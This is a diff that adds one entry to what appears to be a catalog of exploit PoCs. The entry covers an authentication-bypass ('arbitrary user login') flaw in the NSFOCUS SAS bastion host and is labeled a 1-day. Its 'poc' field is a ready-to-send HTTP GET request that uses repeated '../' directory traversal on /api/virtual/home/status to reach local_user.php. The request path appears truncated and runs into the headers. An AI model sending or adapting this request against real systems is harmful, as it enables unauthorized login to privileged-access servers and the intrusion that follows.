@@ -1,0 +1,8 @@
+vendor = "绿盟"
+name = "绿盟sas堡垒机local_user.php任意用户登录漏洞"
+type = "认证绕过"
+source = "微信"
+info = "/api/virtual/home/status?cat="
+date = "08.11"
+poc = "GET /api/virtual/home/status?cat=../../../../../../../../../../../../../../usr/local/nsfocus/web/apache2/www/loc Host: 1.1.1.1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12. Accept-Encoding: gzip, deflate Connection: close"
+label = "1day"
